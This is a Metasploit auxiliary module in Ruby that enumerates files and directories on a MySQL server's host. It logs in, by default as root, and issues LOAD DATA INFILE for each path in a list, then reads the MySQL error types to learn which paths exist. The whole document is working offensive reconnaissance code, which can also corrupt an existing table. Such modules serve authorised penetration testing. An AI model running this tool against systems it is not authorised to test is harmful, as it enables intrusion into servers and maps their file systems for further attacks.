##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'yaml'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::MYSQL
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::OptionalSession::MySQL

  def initialize
    super(
      'Name'           => 'MYSQL File/Directory Enumerator',
      'Description'    => %Q{
          Enumerate files and directories using the MySQL load_file feature, for more
        information see the URL in the references.
      },
      'Author'         => [ 'Robin Wood <robin[at]digininja.org>' ],
      'References'  => [
        [ 'URL', 'http://pauldotcom.com/2013/01/mysql-file-system-enumeration.html' ],
        [ 'URL', 'http://www.digininja.org/projects/mysql_file_enum.php' ]
      ],
      'License'        => MSF_LICENSE
    )

    register_options([
      OptPath.new('FILE_LIST', [ true, "List of directories to enumerate", '' ]),
      OptString.new('DATABASE_NAME', [ true, "Name of database to use", 'mysql' ]),
      OptString.new('TABLE_NAME', [ true, "Name of table to use - Warning, if the table already exists its contents will be corrupted", Rex::Text.rand_text_alpha(8) ]),
      OptString.new('USERNAME', [ true, 'The username to authenticate as', "root" ])
    ])

  end

  # This function does not handle any errors, if you use this
  # make sure you handle the errors yourself
  def mysql_query_no_handle(sql)
    res = self.mysql_conn.query(sql)
    res
  end

  def run_host(ip)
    vprint_status("Login...") unless session

    # If we have a session make use of it
    if session
      print_status("Using existing session #{session.sid}")
      self.mysql_conn = session.client
    else
      # otherwise fallback to attempting to login
      return unless mysql_login_datastore
    end

    begin
      mysql_query_no_handle("USE " + datastore['DATABASE_NAME'])
    rescue ::Rex::Proto::MySQL::Client::Error => e
      vprint_error("MySQL Error: #{e.class} #{e.to_s}")
      return
    rescue Rex::ConnectionTimeout => e
      vprint_error("Timeout: #{e.message}")
      return
    end

    res = mysql_query("SELECT * FROM information_schema.TABLES WHERE TABLE_SCHEMA = '" + datastore['DATABASE_NAME'] + "' AND TABLE_NAME = '" + datastore['TABLE_NAME'] + "';")
    table_exists = (res.size == 1)

    if !table_exists
      vprint_status("Table doesn't exist so creating it")
      mysql_query("CREATE TABLE " + datastore['TABLE_NAME'] + " (brute int);")
    end

    file = File.new(datastore['FILE_LIST'], "r")
    file.each_line do |line|
      check_dir(line.chomp)
    end
    file.close

    if !table_exists
      vprint_status("Cleaning up the temp table")
      mysql_query("DROP TABLE " + datastore['TABLE_NAME'])
    end
  end

  def check_dir dir
    begin
      res = mysql_query_no_handle("LOAD DATA INFILE '" + dir + "' INTO TABLE " + datastore['TABLE_NAME'])
    rescue ::Rex::Proto::MySQL::Client::TextfileNotReadable
      print_good("#{dir} is a directory and exists")
      report_note(
        :host  => mysql_conn.peerhost,
        :type  => "filesystem.dir",
        :data  => { :directory => dir },
        :port  => mysql_conn.peerport,
        :proto => 'tcp',
        :update => :unique_data
      )
    rescue ::Rex::Proto::MySQL::Client::DataTooLong, ::Rex::Proto::MySQL::Client::TruncatedWrongValueForField
      print_good("#{dir} is a file and exists")
      report_note(
        :host  => mysql_conn.peerhost,
        :type  => "filesystem.file",
        :data  => { :directory => dir },
        :port  => mysql_conn.peerport,
        :proto => 'tcp',
        :update => :unique_data
      )
    rescue ::Rex::Proto::MySQL::Client::ServerError
      vprint_warning("#{dir} does not exist")
    rescue ::Rex::Proto::MySQL::Client::Error => e
      vprint_error("MySQL Error: #{e.class} #{e.to_s}")
      return
    rescue Rex::ConnectionTimeout => e
      vprint_error("Timeout: #{e.message}")
      return
    else
      print_good("#{dir} is a file and exists")
      report_note(
        :host  => mysql_conn.peerhost,
        :type  => "filesystem.file",
        :data  => { :file => dir },
        :port  => mysql_conn.peerport,
        :proto => 'tcp',
        :update => :unique_data
      )
    end

    return
  end
end
